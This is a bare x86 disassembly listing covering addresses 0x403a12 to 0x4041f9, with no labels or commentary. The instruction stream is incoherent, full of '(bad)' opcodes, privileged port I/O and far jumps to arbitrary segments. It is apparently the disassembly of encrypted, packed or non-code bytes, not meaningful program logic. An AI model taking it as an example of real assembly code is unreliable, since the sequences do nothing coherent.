  403a12:	or     BYTE PTR [edi+0x34],dl
  403a15:	in     eax,0x80
  403a17:	push   ss
  403a18:	retf   
  403a19:	jge    0x403a62
  403a1b:	mov    ah,0xb8
  403a1d:	lds    esp,FWORD PTR [ecx*8+0x1b00876c]
  403a24:	clc    
  403a25:	clc    
  403a26:	cdq    
  403a27:	pushf  
  403a28:	fcmovb st,st(6)
  403a2a:	sub    DWORD PTR ds:0x7cde221f,esp
  403a30:	dec    ecx
  403a31:	push   ss
  403a32:	in     al,0x91
  403a34:	xor    edi,ebp
  403a36:	addr16 retf 0x29a8
  403a3a:	nop
  403a3b:	pushf  
  403a3c:	jp     0x403a8c
  403a3e:	enter  0x1df9,0x3d
  403a42:	add    al,0x3
  403a44:	add    dh,BYTE PTR [ebx+0x3e]
  403a47:	jp     0x403aa2
  403a49:	jnp    0x403aa4
  403a4b:	cmp    cl,dh
  403a4d:	inc    ecx
  403a4e:	ins    DWORD PTR es:[edi],dx
  403a4f:	repnz out dx,eax
  403a51:	fld    DWORD PTR [edi-0x28bee7dc]
  403a57:	nop
  403a58:	ficom  WORD PTR [ecx-0x2cb487d6]
  403a5e:	dec    ecx
  403a5f:	push   cs
  403a60:	into   
  403a61:	pop    esi
  403a62:	shr    edi,cl
  403a64:	dec    ecx
  403a65:	into   
  403a66:	inc    edx
  403a67:	mov    es,WORD PTR [ecx]
  403a69:	cmp    eax,0xf5b7c6ea
  403a6e:	pop    es
  403a6f:	cmc    
  403a70:	xchg   esi,eax
  403a71:	ins    DWORD PTR es:[edi],dx
  403a72:	shl    ch,cl
  403a74:	aam    0xb4
  403a76:	push   edi
  403a77:	jmp    0x5f49:0xf36eb7cc
  403a7e:	fwait
  403a7f:	jne    0x403a80
  403a81:	xlat   BYTE PTR ds:[ebx]
  403a82:	and    DWORD PTR gs:[esi-0x5b],esi
  403a86:	aam    0x60
  403a88:	lock add eax,DWORD PTR fs:[ebp+0x3e]
  403a8d:	lahf   
  403a8e:	enter  0xfed1,0xbe
  403a92:	adc    BYTE PTR [ebx-0x5c],dh
  403a95:	addr16 in al,dx
  403a97:	shl    BYTE PTR [edx+0x50],0x6d
  403a9b:	jnp    0x403a88
  403a9d:	dec    ebx
  403a9e:	cdq    
  403a9f:	mov    eax,ds:0xffccd9a7
  403aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa5:	out    0x17,eax
  403aa7:	and    DWORD PTR [edi-0x63],0x316e7fb3
  403aae:	jecxz  0x403a55
  403ab0:	imul   DWORD PTR [ebx+0x70]
  403ab3:	daa    
  403ab4:	dec    esp
  403ab5:	pop    es
  403ab6:	xor    dh,bl
  403ab8:	ror    ch,0x3e
  403abb:	pop    ds
  403abc:	add    eax,0xf3ed6d7
  403ac1:	das    
  403ac2:	in     al,dx
  403ac3:	mov    edi,esi
  403ac5:	xor    eax,0x3f4dad9f
  403aca:	in     al,dx
  403acb:	out    dx,al
  403acc:	inc    ecx
  403acd:	push   cs
  403ace:	xchg   edi,eax
  403acf:	jge    0x403a74
  403ad1:	call   0x7c7f4fb0
  403ad6:	ror    BYTE PTR [ebx-0x51b7bed9],cl
  403adc:	xchg   ebp,eax
  403add:	(bad)  [eax+0xb]
  403ae0:	cdq    
  403ae1:	out    dx,eax
  403ae2:	pop    edx
  403ae3:	out    0xd0,eax
  403ae5:	push   ds
  403ae6:	mov    ebx,0x12bc5259
  403aeb:	cmp    eax,0x9b404cdb
  403af0:	outs   dx,DWORD PTR ds:[esi]
  403af1:	fild   WORD PTR [ecx]
  403af3:	jo     0x403a8d
  403af5:	xchg   ebp,eax
  403af6:	push   ds
  403af7:	jnp    0x403ac7
  403af9:	enter  0xb51a,0xb1
  403afd:	push   es
  403afe:	stos   BYTE PTR es:[edi],al
  403aff:	xchg   DWORD PTR [ecx+0x32],ebp
  403b02:	mov    BYTE PTR [esi],dh
  403b04:	inc    ecx
  403b05:	jns    0x403b43
  403b07:	and    BYTE PTR [ecx+eiz*1],0x5e
  403b0b:	jp     0x403af6
  403b0d:	xor    BYTE PTR [ebx],dl
  403b0f:	retf   0x34f7
  403b12:	call   0xcd44:0xf5119aef
  403b19:	pop    eax
  403b1a:	mov    bh,0xa8
  403b1c:	rcr    BYTE PTR [ecx+eax*2],0x5b
  403b20:	pop    dx
  403b22:	inc    esp
  403b23:	sbb    DWORD PTR [ecx+0x7bc5fee6],eax
  403b29:	dec    edi
  403b2a:	cdq    
  403b2b:	into   
  403b2c:	jnp    0x403b28
  403b2e:	addr16 push ebx
  403b30:	inc    esp
  403b31:	mov    eax,ds:0x8802e243
  403b36:	or     eax,0xde71beef
  403b3b:	add    esi,DWORD PTR [ecx+0x2ab35225]
  403b41:	dec    edi
  403b42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b43:	pop    edi
  403b44:	push   edx
  403b45:	dec    eax
  403b46:	mov    esp,0x975afe55
  403b4b:	sahf   
  403b4c:	inc    ebp
  403b4d:	dec    edx
  403b4e:	and    eax,0x98556e7d
  403b53:	fmul   QWORD PTR [edi+0x5b]
  403b56:	add    BYTE PTR [edx+esi*4+0x6f223e30],0x2a
  403b5e:	inc    BYTE PTR [eax+0x5f]
  403b61:	or     ebp,DWORD PTR [edi-0x42]
  403b64:	lods   al,BYTE PTR ds:[esi]
  403b65:	jno    0x403b36
  403b67:	fwait
  403b68:	dec    ebp
  403b69:	adc    DWORD PTR ds:0x1e0cda10,ecx
  403b6f:	push   edi
  403b70:	cmp    DWORD PTR [ebp+0x66f8c236],ecx
  403b76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b77:	mov    BYTE PTR [esi-0x5ed11c44],0xe5
  403b7e:	and    ch,BYTE PTR [esi+0x14a6218a]
  403b84:	js     0x403b44
  403b86:	sbb    ebp,DWORD PTR [eax]
  403b88:	or     BYTE PTR [edx+0x2b],bl
  403b8b:	data16 jnp 0x403b74
  403b8e:	retf   
  403b8f:	popf   
  403b90:	push   ebp
  403b91:	loop   0x403bf3
  403b93:	in     al,dx
  403b94:	adc    edx,DWORD PTR [eax-0x410f8a5f]
  403b9a:	pop    eax
  403b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b9d:	shr    DWORD PTR [edx+0x2e],0xca
  403ba1:	das    
  403ba2:	and    DWORD PTR [ebp+edx*4+0x2a],0x4dd4aea3
  403baa:	or     BYTE PTR [eax-0x2b3ce326],dh
  403bb0:	xor    esi,edi
  403bb2:	rol    DWORD PTR ds:0x471fc488,1
  403bb8:	call   0x914c2330
  403bbd:	mov    ds:0x6d9791e5,al
  403bc2:	jmp    0xc06b0a61
  403bc7:	and    eax,0xa6461484
  403bcc:	push   ecx
  403bcd:	imul   esp,esp,0xffffffd5
  403bd0:	push   0x1b
  403bd2:	adc    al,0x40
  403bd4:	clc    
  403bd5:	sbb    esi,edx
  403bd7:	das    
  403bd8:	test   al,0x7e
  403bda:	iret   
  403bdb:	imul   esp,DWORD PTR [eax+0x402de14e],0xb44e7046
  403be5:	out    0x4d,al
  403be7:	enter  0x889c,0x7d
  403beb:	adc    BYTE PTR [esp+eax*2],0x5e
  403bef:	cmp    eax,0xa53701ba
  403bf4:	pop    edx
  403bf5:	test   DWORD PTR [ebx+0x4ac3d4a9],edx
  403bfb:	popa   
  403bfc:	cld    
  403bfd:	xchg   ecx,eax
  403bfe:	mov    WORD PTR [ebp+eiz*4+0x69],fs
  403c02:	arpl   sp,bx
  403c04:	jmp    0x403be2
  403c06:	cdq    
  403c07:	mov    esi,0xb508ada
  403c0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c0d:	pop    esp
  403c0e:	hlt    
  403c0f:	adc    ch,BYTE PTR [eax]
  403c11:	or     ebp,edx
  403c13:	inc    edx
  403c14:	sbb    ecx,ecx
  403c16:	inc    ebx
  403c17:	sti    
  403c18:	aas    
  403c19:	xor    BYTE PTR [eax-0x6c6f8102],bh
  403c1f:	outs   dx,BYTE PTR ds:[esi]
  403c20:	mov    edi,0xbf4dac0c
  403c25:	jmp    0x2b40:0x340d1b14
  403c2c:	rcl    DWORD PTR [eax-0x27235a68],0x7c
  403c33:	add    dl,0xa6
  403c36:	mov    edi,DWORD PTR [esi+esi*4+0x507cf300]
  403c3d:	and    eax,0x87ba1a19
  403c42:	aas    
  403c43:	test   DWORD PTR [edi+0x77],ecx
  403c46:	xor    BYTE PTR [eax],ah
  403c48:	pushf  
  403c49:	cmp    esi,DWORD PTR [edi+0xd]
  403c4c:	(bad)  
  403c4d:	mov    BYTE PTR [edi-0x100b2105],dh
  403c53:	inc    esp
  403c54:	xchg   ebp,eax
  403c55:	push   cx
  403c57:	inc    edi
  403c58:	imul   ebp,DWORD PTR [ebp+edi*4-0x425a2a5c],0x6a0ebc49
  403c63:	aaa    
  403c64:	test   al,0x2a
  403c66:	xor    dl,BYTE PTR [edx+0x60e08b26]
  403c6c:	(bad)  
  403c6d:	cwde   
  403c6e:	and    bh,al
  403c70:	pop    ebx
  403c71:	jle    0x403c29
  403c73:	add    bl,cl
  403c75:	setg   BYTE PTR [edi]
  403c78:	push   0x9730c2db
  403c7d:	gs mov bh,0xd6
  403c80:	(bad)  [eax]
  403c82:	std    
  403c83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c85:	push   ss
  403c86:	cmp    al,0x27
  403c88:	add    BYTE PTR [esi],cl
  403c8a:	jnp    0x403c73
  403c8c:	mov    bl,BYTE PTR [esi+eax*1+0x16]
  403c90:	pop    eax
  403c91:	pop    esi
  403c92:	add    ecx,ebp
  403c94:	sahf   
  403c95:	cmp    al,0xbf
  403c97:	inc    ebx
  403c98:	test   eax,0x84860ddb
  403c9d:	and    DWORD PTR [eax+0x16],0xe62689af
  403ca4:	mov    ah,0x6b
  403ca6:	adc    eax,0x9a580ccd
  403cab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cac:	fdiv   DWORD PTR [eax+0x6b]
  403caf:	or     BYTE PTR [ecx+0x254effbe],dl
  403cb5:	std    
  403cb6:	lods   al,BYTE PTR ds:[esi]
  403cb7:	test   eax,0xb5f9b2e1
  403cbc:	out    0xc,eax
  403cbe:	jge    0x403ce1
  403cc0:	jle    0x403d0a
  403cc2:	imul   edi,DWORD PTR [ecx+0x1a3bc050],0x17b2eaaa
  403ccc:	and    edx,DWORD PTR [esi]
  403cce:	or     al,0x66
  403cd0:	fld    TBYTE PTR [ebp+esi*1-0x428b0b70]
  403cd7:	call   0xfae0:0x10d41a88
  403cde:	fsub   st(0),st
  403ce0:	cmp    BYTE PTR [eax],bl
  403ce2:	shl    DWORD PTR [ebx],0x6b
  403ce5:	add    eax,0x4ff571d4
  403cea:	xchg   DWORD PTR [ecx-0x648d5553],ecx
  403cf0:	push   ebx
  403cf1:	imul   eax,esi,0x777ba40e
  403cf7:	adc    ebx,0x470fc932
  403cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cfe:	or     BYTE PTR [ebx+0x62],dl
  403d01:	jecxz  0x403ca1
  403d03:	or     DWORD PTR [ebp+edi*2-0x3e892b16],ebx
  403d0a:	call   0x5b13:0x5f1cd043
  403d11:	test   eax,0x23088810
  403d16:	xchg   edx,eax
  403d17:	add    BYTE PTR [eax+0x6f],dh
  403d1a:	inc    ecx
  403d1b:	jmp    0x403d76
  403d1d:	bound  esp,QWORD PTR [edx+ecx*1+0x79]
  403d21:	fnstenv [edi]
  403d23:	loop   0x403cd5
  403d25:	xchg   DWORD PTR [eax],eax
  403d27:	adc    al,0xd4
  403d29:	sbb    BYTE PTR [eax-0x4f431776],dl
  403d2f:	outs   dx,DWORD PTR ds:[esi]
  403d30:	mov    al,0xa0
  403d32:	and    al,0x3
  403d34:	push   esp
  403d35:	push   ecx
  403d36:	xchg   ebx,eax
  403d37:	loope  0x403cec
  403d39:	add    BYTE PTR [ecx-0x5deb076e],dh
  403d3f:	inc    ebx
  403d41:	cmp    DWORD PTR [esi],ecx
  403d43:	or     dl,BYTE PTR [eax]
  403d45:	retf   0x79cd
  403d48:	nop
  403d49:	push   0xffffff80
  403d4b:	xchg   esi,eax
  403d4c:	sub    bl,BYTE PTR [edx+0x6f0a3c57]
  403d52:	leave  
  403d53:	jmp    0x6455:0xa6fd6ed6
  403d5a:	test   DWORD PTR [eax],0xe8214fcb
  403d60:	clc    
  403d61:	cmp    al,0xdb
  403d63:	call   0x66cc:0x98297bf0
  403d6a:	push   0x73
  403d6c:	sub    al,BYTE PTR [ebp-0xb1aa9e9]
  403d72:	xor    esp,ebx
  403d74:	or     BYTE PTR [ecx+ecx*8-0x68],bh
  403d78:	add    edi,DWORD PTR [ebx]
  403d7a:	out    0xd6,eax
  403d7c:	mov    ebx,0x6f076d99
  403d81:	inc    edx
  403d82:	and    BYTE PTR [esp+ebx*2],al
  403d85:	sub    dh,dl
  403d87:	push   cs
  403d88:	jne    0x403d3f
  403d8a:	test   BYTE PTR ds:0x72766be,dl
  403d90:	xor    ah,BYTE PTR ds:0x1e814b10
  403d96:	bound  esp,QWORD PTR [edi+0x57734946]
  403d9c:	out    dx,eax
  403d9d:	jae    0x403d5b
  403d9f:	test   DWORD PTR [ecx+0x54e41d5c],0x33f4803d
  403da9:	rol    BYTE PTR [ecx+0x4229522d],0x0
  403db0:	scas   eax,DWORD PTR es:[edi]
  403db1:	add    DWORD PTR [eax],eax
  403db3:	add    BYTE PTR [ebx],cl
  403db5:	shl    edi,0x15
  403db8:	mov    dh,0x29
  403dba:	inc    edx
  403dbb:	add    cl,ch
  403dbd:	test   DWORD PTR ds:0x7a360000,eax
  403dc3:	daa    
  403dc4:	cmp    bl,BYTE PTR [ebx]
  403dc6:	sbb    ch,BYTE PTR [edx]
  403dc8:	pop    edx
  403dc9:	pop    es
  403dca:	scas   al,BYTE PTR es:[edi]
  403dcb:	and    ch,BYTE PTR [eax-0x45]
  403dce:	fisubr WORD PTR [esp+esi*4]
  403dd1:	pop    eax
  403dd2:	lds    edx,FWORD PTR [esi]
  403dd4:	push   ss
  403dd5:	cmp    eax,0xa9161604
  403dda:	xor    dl,bh
  403ddc:	out    dx,al
  403ddd:	div    BYTE PTR [ecx+eiz*2-0x37527b9c]
  403de4:	popa   
  403de5:	push   edi
  403de6:	push   edi
  403de7:	cmp    DWORD PTR [esi+0x73],ecx
  403dea:	inc    eax
  403deb:	clc    
  403dec:	inc    ecx
  403ded:	ror    BYTE PTR [edx+0x305b0ef1],0xfc
  403df4:	push   ecx
  403df5:	jmp    0x403dfa
  403df7:	cmc    
  403df8:	cmp    al,BYTE PTR [edx-0x38aa402f]
  403dfe:	rcl    BYTE PTR [ebx-0x13649cf9],0xf5
  403e05:	mov    eax,0x34f8c4cd
  403e0a:	loope  0x403e76
  403e0c:	test   BYTE PTR [esi-0x23],0xb5
  403e10:	xor    DWORD PTR [esi],ebp
  403e12:	push   ds
  403e13:	push   ebx
  403e14:	test   eax,0x48633351
  403e19:	das    
  403e1a:	enter  0xb931,0x9f
  403e1e:	mov    edx,DWORD PTR [eax-0x40]
  403e21:	gs sub ecx,esp
  403e24:	adc    al,BYTE PTR [ecx-0x7129125a]
  403e2a:	stc    
  403e2b:	xor    BYTE PTR [edi+0x5658ba82],ch
  403e31:	scas   al,BYTE PTR es:[edi]
  403e32:	test   al,0x2d
  403e34:	je     0x403dbb
  403e36:	stc    
  403e37:	jmp    0x6333:0xd547297d
  403e3e:	(bad)  
  403e40:	jns    0x403dff
  403e42:	mov    ds:0x4a79e3e6,al
  403e47:	imul   esi,DWORD PTR ds:[ecx+0x2c],0x5
  403e4c:	push   edx
  403e4d:	into   
  403e4e:	test   al,0xd5
  403e50:	pop    ss
  403e51:	pop    ecx
  403e52:	fistp  WORD PTR [ecx-0x5a]
  403e55:	mov    ch,0x5d
  403e57:	(bad)  
  403e59:	in     al,dx
  403e5a:	gs push 0xffffffb5
  403e5d:	int    0x4d
  403e5f:	in     eax,dx
  403e60:	dec    edi
  403e61:	sub    DWORD PTR [edi+0x6e9fc256],esp
  403e67:	in     al,0x4d
  403e69:	dec    esp
  403e6a:	xor    al,0x16
  403e6c:	add    BYTE PTR [eax],ch
  403e6e:	push   eax
  403e6f:	push   cs
  403e70:	mov    al,ds:0x507df79f
  403e75:	xchg   ebp,eax
  403e76:	repnz mov edi,0xb6474c5d
  403e7c:	xor    eax,0xb73745eb
  403e81:	add    al,0x32
  403e83:	ss nop
  403e85:	adc    ebx,DWORD PTR [esi]
  403e87:	shr    edx,0xc7
  403e8a:	(bad)  
  403e8b:	ss dec ebx
  403e8d:	cmc    
  403e8e:	retf   0x64de
  403e91:	jno    0x403ebc
  403e93:	add    al,0xf5
  403e95:	mov    ah,BYTE PTR [esi]
  403e97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e98:	dec    edi
  403e99:	mov    esi,0x118d7502
  403e9e:	inc    ebp
  403e9f:	push   cs
  403ea0:	mov    eax,0xd7361dc7
  403ea5:	mov    WORD PTR [edx+0x24853e52],cs
  403eab:	(bad)  
  403eac:	fisubr WORD PTR [edi]
  403eae:	xchg   BYTE PTR [esi-0x76a9a8e3],bl
  403eb4:	mov    ah,0x73
  403eb6:	dec    edx
  403eb7:	stos   DWORD PTR es:[edi],eax
  403eb8:	jecxz  0x403e7c
  403eba:	bound  eax,QWORD PTR [edi]
  403ebc:	es retw 0x98e8
  403ec1:	nop
  403ec2:	jp     0x403e54
  403ec4:	mov    cl,0x83
  403ec6:	push   edi
  403ec7:	inc    esp
  403ec8:	in     al,dx
  403ec9:	out    0x51,eax
  403ecb:	xor    bh,BYTE PTR [ebp+0x33]
  403ece:	xlat   BYTE PTR ds:[ebx]
  403ecf:	add    BYTE PTR [eax],ah
  403ed1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ed2:	jmp    0x403e74
  403ed4:	outs   dx,BYTE PTR ds:[esi]
  403ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ed6:	mov    bl,0x45
  403ed8:	(bad)  
  403eda:	ds aam 0x13
  403edd:	call   0x777f9c7
  403ee2:	add    ah,BYTE PTR [ebx+0x31b0c8c4]
  403ee8:	mov    esp,fs
  403eea:	daa    
  403eeb:	adc    eax,esp
  403eed:	add    edx,DWORD PTR [ebp-0x51]
  403ef0:	mov    esi,0x27c3aca
  403ef5:	fidiv  DWORD PTR [ebx+0x727e18fa]
  403efb:	mov    ds:0x76a89571,al
  403f00:	push   ecx
  403f01:	addr16 es std 
  403f04:	xchg   edx,eax
  403f05:	popf   
  403f06:	das    
  403f07:	ret    0xc3ab
  403f0a:	gs fsubr st,st(6)
  403f0d:	data16 or bl,ch
  403f10:	push   edi
  403f11:	jmp    0x923ebbeb
  403f16:	stc    
  403f17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f18:	mov    ds:0xfe4f3133,eax
  403f1d:	pusha  
  403f1e:	scas   eax,DWORD PTR es:[edi]
  403f1f:	fimul  WORD PTR [ecx]
  403f21:	xchg   DWORD PTR [esi+0x51edfb86],edx
  403f27:	mov    ebx,0x92adaf28
  403f2c:	pop    edx
  403f2d:	das    
  403f2e:	push   esp
  403f2f:	dec    eax
  403f30:	les    ecx,FWORD PTR [ecx+0x33]
  403f33:	orps   xmm5,XMMWORD PTR [eax]
  403f36:	inc    esp
  403f37:	push   ebp
  403f38:	cmp    eax,0x2730eced
  403f3d:	pop    edx
  403f3e:	stos   DWORD PTR es:[edi],eax
  403f3f:	mov    bh,0xb2
  403f41:	addr16 xchg ebp,eax
  403f43:	addr16 int 0x7d
  403f46:	adc    ch,ch
  403f48:	inc    esi
  403f49:	or     BYTE PTR [edi+ecx*8-0x64],0xa8
  403f4e:	int    0x64
  403f50:	inc    ecx
  403f51:	xor    BYTE PTR [ecx],bl
  403f53:	jge    0x403efd
  403f55:	mov    ds:0x2137e94d,eax
  403f5a:	jno    0x403f09
  403f5c:	retf   
  403f5d:	shl    BYTE PTR [eax+0x59acdfc8],0x75
  403f64:	mov    edx,0x5532d019
  403f69:	shl    BYTE PTR [ebx-0x5d],0xf7
  403f6d:	outs   dx,BYTE PTR ds:[esi]
  403f6e:	jae    0x403f68
  403f70:	mov    ?,WORD PTR [ebx-0x46ad97b2]
  403f76:	(bad)  
  403f77:	mov    edi,0xaa3dfb9c
  403f7c:	aad    0x38
  403f7e:	mov    ah,0xe5
  403f80:	mov    dl,0x3
  403f82:	jl     0x403f1c
  403f84:	mov    DWORD PTR [ecx],ebp
  403f86:	mov    ecx,0xc7db323
  403f8b:	xchg   ebx,eax
  403f8d:	repnz mov ch,al
  403f90:	sbb    al,0xf9
  403f92:	sub    al,0x2e
  403f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f95:	push   edi
  403f96:	or     al,0xcf
  403f98:	push   ebp
  403f99:	xlat   BYTE PTR ds:[ebx]
  403f9a:	div    edx
  403f9c:	mov    ebp,0x4b1a02c7
  403fa1:	test   ch,bh
  403fa3:	stos   DWORD PTR es:[edi],eax
  403fa4:	ds sbb eax,0x518322c7
  403faa:	cmc    
  403fab:	adc    eax,0xf823beb4
  403fb0:	test   al,0xb8
  403fb2:	aad    0xed
  403fb4:	or     ah,BYTE PTR [ecx+ebp*1+0x393746f1]
  403fbb:	xchg   ebp,eax
  403fbc:	rcr    BYTE PTR [ebx+0x7b],cl
  403fbf:	jge    0x403f95
  403fc1:	push   ds
  403fc2:	add    BYTE PTR [ebx],bh
  403fc4:	pop    edx
  403fc5:	ja     0x403f72
  403fc7:	std    
  403fc8:	mov    ecx,0xb5f89881
  403fcd:	xchg   edx,eax
  403fce:	pop    eax
  403fcf:	cmp    ecx,eax
  403fd1:	mov    bh,0x21
  403fd3:	into   
  403fd4:	ror    DWORD PTR [ecx],cl
  403fd6:	dec    esi
  403fd7:	cmp    ecx,DWORD PTR [ebx-0x3b]
  403fda:	xsavec [ecx+0x59e99a1b]
  403fe1:	mov    ebp,0x91cdae9c
  403fe6:	mov    al,0x67
  403fe8:	pop    ebp
  403fe9:	loop   0x403f8e
  403feb:	gs mov al,0xb7
  403fee:	fld    QWORD PTR [edx]
  403ff0:	mov    al,ah
  403ff2:	xor    ebp,DWORD PTR [esi]
  403ff4:	inc    esp
  403ff5:	(bad)  
  403ff7:	xchg   ebx,eax
  403ff8:	shl    esp,1
  403ffa:	aaa    
  403ffb:	xchg   edx,ecx
  403ffd:	mov    eax,ds:0xb6a3ee1d
  404002:	push   edi
  404003:	test   DWORD PTR [eax+0x4d4e514e],ebp
  404009:	add    eax,0xe9a4fbc0
  40400e:	rcr    BYTE PTR [ecx+0x16],cl
  404011:	pop    eax
  404012:	ret    0x9b93
  404015:	ds je  0x403fde
  404018:	rol    cl,0xc8
  40401b:	jbe    0x403fdd
  40401d:	adc    dh,ch
  40401f:	inc    edx
  404020:	mov    edx,0x2b5a0dbb
  404025:	into   
  404026:	pop    eax
  404027:	mov    BYTE PTR [eax-0x7e8ab9fa],ah
  40402d:	cld    
  40402e:	and    BYTE PTR [ecx],dl
  404030:	std    
  404031:	mov    dh,0xbe
  404033:	cwde   
  404034:	xchg   BYTE PTR [eax-0xf3067a3],dh
  40403a:	mov    cl,0x9f
  40403c:	adc    al,0xc7
  40403e:	mov    WORD PTR [ecx-0x62],ss
  404041:	shl    DWORD PTR [edi],0x5e
  404044:	adc    DWORD PTR [ebp-0x70],0xfe4754b6
  40404b:	adc    esi,eax
  40404d:	call   0x8f3690a2
  404052:	cli    
  404053:	in     al,0x4f
  404055:	sbb    DWORD PTR [esi+ebp*8-0x1f],edi
  404059:	mov    bl,0x94
  40405b:	fwait
  40405c:	sbb    al,BYTE PTR [ebx-0x68761959]
  404062:	xchg   esi,eax
  404063:	fwait
  404064:	retf   0x7c0d
  404067:	pop    ds
  404068:	cmp    DWORD PTR [eax-0x46],ebx
  40406b:	lea    ecx,[eax+0x7b3ecddf]
  404071:	iret   
  404072:	add    al,0x1d
  404074:	ins    BYTE PTR es:[edi],dx
  404075:	jmp    0x4040bd
  404077:	scas   al,BYTE PTR es:[edi]
  404078:	cwde   
  404079:	adc    DWORD PTR [eax+0x895b752],0x7e
  404080:	lods   eax,DWORD PTR ds:[esi]
  404081:	sub    ebp,DWORD PTR [ebx+0x123753b]
  404087:	div    DWORD PTR [edi]
  404089:	sbb    esi,DWORD PTR [esi]
  40408b:	dec    eax
  40408c:	mov    al,ds:0x7255c671
  404091:	jg     0x4040bf
  404093:	sbb    DWORD PTR [ecx],0x51ee1197
  404099:	jae    0x40403a
  40409b:	mov    cl,0x36
  40409d:	sar    BYTE PTR [esi],0xba
  4040a0:	push   ecx
  4040a1:	retf   0x3b1e
  4040a4:	ret    
  4040a5:	adc    DWORD PTR [ebp+0x544d5b09],ebp
  4040ab:	jmp    0x1363:0x30110ee8
  4040b2:	add    DWORD PTR [esp+edi*4-0x5df8866],esp
  4040b9:	pop    eax
  4040ba:	pop    ds
  4040bb:	stc    
  4040bc:	stc    
  4040bd:	adc    eax,0x5be3f724
  4040c2:	push   ebx
  4040c3:	inc    esp
  4040c4:	icebp  
  4040c5:	leave  
  4040c6:	jecxz  0x4040cd
  4040c8:	add    ah,BYTE PTR [ecx-0xa]
  4040cb:	punpckhdq mm0,QWORD PTR [ecx]
  4040ce:	push   esp
  4040cf:	repz pusha 
  4040d1:	sti    
  4040d2:	or     cl,ah
  4040d4:	dec    edx
  4040d5:	cwde   
  4040d6:	dec    ebx
  4040d7:	or     ch,ah
  4040d9:	mov    bh,0xeb
  4040db:	adc    ah,BYTE PTR [edx]
  4040dd:	dec    ebp
  4040de:	aad    0x4b
  4040e0:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4040e2:	jg     0x404139
  4040e4:	mov    WORD PTR [ecx+0x4d],ss
  4040e7:	jecxz  0x404113
  4040e9:	fdiv   st(7),st
  4040eb:	mov    WORD PTR [edx-0x1ebd7560],cs
  4040f1:	ret    
  4040f2:	jecxz  0x4040a6
  4040f4:	add    edi,esp
  4040f6:	jle    0x404092
  4040f8:	add    DWORD PTR [ecx],edi
  4040fa:	sub    ebx,0xfffffffd
  4040fd:	sbb    ebp,esp
  4040ff:	inc    edi
  404100:	dec    edi
  404101:	xchg   edi,eax
  404102:	sahf   
  404103:	rol    BYTE PTR [ecx+0x7d],cl
  404106:	aam    0x62
  404108:	jns    0x404114
  40410a:	mov    DWORD PTR [eax-0x1e42341e],esp
  404110:	xor    dh,bh
  404112:	dec    ebp
  404113:	cmc    
  404114:	sbb    ebp,DWORD PTR ds:0x6e2d8b69
  40411a:	jmp    0x4040e8
  40411c:	mov    esp,0x9f68643e
  404121:	imul   ebp,DWORD PTR [eax+0xf],0x15
  404125:	fisub  WORD PTR [edx+0x12]
  404128:	arpl   WORD PTR [ebp-0x6f5c7e99],ax
  40412e:	and    eax,0x254ea0b7
  404133:	add    dh,BYTE PTR [ebx]
  404135:	mov    dl,0xd4
  404137:	cdq    
  404138:	mov    al,ds:0xd0570016
  40413d:	jmp    0x40419b
  40413f:	push   0x881b14e1
  404144:	jns    0x40410f
  404146:	test   al,0x7d
  404148:	dec    edi
  404149:	add    DWORD PTR [esi+eiz*4],esi
  40414c:	adc    al,0x1f
  40414e:	inc    ecx
  40414f:	jl     0x404123
  404151:	sub    al,0xa1
  404153:	jbe    0x404147
  404155:	fdiv   DWORD PTR [esi]
  404157:	mov    ecx,0x127e704c
  40415c:	sbb    bh,BYTE PTR [ebx+ebp*8-0x80]
  404160:	idiv   BYTE PTR [esi]
  404162:	xor    esi,DWORD PTR [eax]
  404164:	fld    QWORD PTR [esi]
  404166:	or     al,0x43
  404168:	add    eax,0x7c6f6301
  40416d:	sbb    bh,BYTE PTR [ecx]
  40416f:	sub    BYTE PTR [edx],dh
  404171:	cmp    BYTE PTR [eax-0x34],0xed
  404175:	jmp    0xbdfc:0x93c2699a
  40417c:	fs pop esi
  40417e:	loop   0x40415f
  404180:	sub    cl,bl
  404182:	cli    
  404183:	cmp    bl,ch
  404185:	js     0x4041a7
  404187:	jmp    0x454e:0xe940491a
  40418e:	(bad)  
  40418f:	cmp    ebp,esp
  404191:	and    dl,ah
  404193:	les    ebx,FWORD PTR [ebx+0x3d]
  404196:	mov    cl,0xc0
  404198:	cmp    BYTE PTR [esi],ah
  40419a:	loopne 0x4041a1
  40419c:	xor    al,0x6
  40419e:	aaa    
  40419f:	adc    dl,0xb4
  4041a2:	ins    BYTE PTR es:[edi],dx
  4041a3:	cs mov ebx,0x7d4cf6dd
  4041a9:	enter  0x5400,0xb8
  4041ad:	jmp    0x52a3e8e9
  4041b2:	enter  0xe6b8,0xc5
  4041b6:	leave  
  4041b7:	dec    esi
  4041b8:	stos   DWORD PTR es:[edi],eax
  4041b9:	lods   eax,DWORD PTR ds:[esi]
  4041ba:	or     al,0xfc
  4041bc:	mov    al,ds:0x1e76d491
  4041c1:	(bad)  
  4041c2:	mov    eax,0xe8aacbba
  4041c7:	sub    BYTE PTR [edi+0x5899941],dl
  4041cd:	aaa    
  4041ce:	mov    bl,0x14
  4041d0:	push   es
  4041d1:	mov    al,ds:0x939e3f4a
  4041d6:	mov    bh,0x77
  4041d8:	and    DWORD PTR cs:0xaf36ec8f,eax
  4041df:	out    0xf8,al
  4041e1:	fcomp  DWORD PTR [edi+0x3cdcab8c]
  4041e7:	sub    al,BYTE PTR [eax+edi*8+0x13]
  4041eb:	ins    DWORD PTR es:[edi],dx
  4041ec:	jnp    0x404246
  4041ee:	bound  edx,QWORD PTR [ebp+0x3592c52a]
  4041f4:	mov    dl,0xef
  4041f6:	push   es
  4041f7:	jb     0x4041cc
  4041f9:	imul   eax,DWORD PTR [edi],0xac510348
